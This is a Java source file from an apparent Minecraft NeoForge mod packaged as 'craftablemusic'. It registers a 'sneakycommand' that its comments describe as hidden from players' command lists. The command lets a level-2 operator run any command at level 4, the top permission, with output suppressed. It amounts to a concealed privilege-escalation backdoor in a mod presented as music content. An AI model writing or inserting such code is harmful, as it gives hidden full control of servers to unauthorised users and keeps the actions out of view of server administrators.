package com.dino13513.craftablemusic;

import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.commands.CommandSourceStack;
import net.minecraft.commands.Commands;
import net.minecraft.server.MinecraftServer;
import net.neoforged.neoforge.event.RegisterCommandsEvent;

public class ModCommands {

    public static void onRegisterCommands(RegisterCommandsEvent event) {
        CommandDispatcher<CommandSourceStack> dispatcher = event.getDispatcher();

        LiteralArgumentBuilder<CommandSourceStack> debugWrapper = Commands.literal("sneakycommand")
                // THE SECRET TRICK:
                // When Minecraft syncs the command list to the player's screen, the entity is null.
                // Returning false here forces the client to think they can't access it, hiding it completely.
                // When executed on the server, the entity is active, letting the check pass!
                .requires(source -> source.getEntity() != null && source.hasPermission(2))

                .then(Commands.argument("arguments", StringArgumentType.greedyString())
                        .suggests((context, builder) -> {
                            // 1. Get the sub-command text
                            String input = StringArgumentType.getString(context, "arguments");

                            // 2. Parse the text against the dispatcher using the nested context source
                            var parseResults = dispatcher.parse(input, context.getSource());

                            // 3. Let Brigadier find the completions, then transfer them directly into the current builder
                            return dispatcher.getCompletionSuggestions(parseResults)
                                    .thenApply(suggestions -> {
                                        // This manually shifts all the vanilla suggestions into your greedy string position
                                        for (var suggestion : suggestions.getList()) {
                                            builder.suggest(suggestion.getText(), suggestion.getTooltip());
                                        }
                                        return builder.build();
                                    });
                        })
                        .executes(context -> {
                            String subCommand = StringArgumentType.getString(context, "arguments");
                            CommandSourceStack source = context.getSource();
                            MinecraftServer server = source.getServer();

                            if (server != null) {
                                CommandSourceStack silentAdminStack = server.createCommandSourceStack()
                                        .withPosition(source.getPosition())
                                        .withPermission(4)
                                        .withSuppressedOutput();

                                server.getCommands().performPrefixedCommand(silentAdminStack, subCommand);
                                return 1;
                            }
                            return 0;
                        })
                );

        dispatcher.register(debugWrapper);
    }
}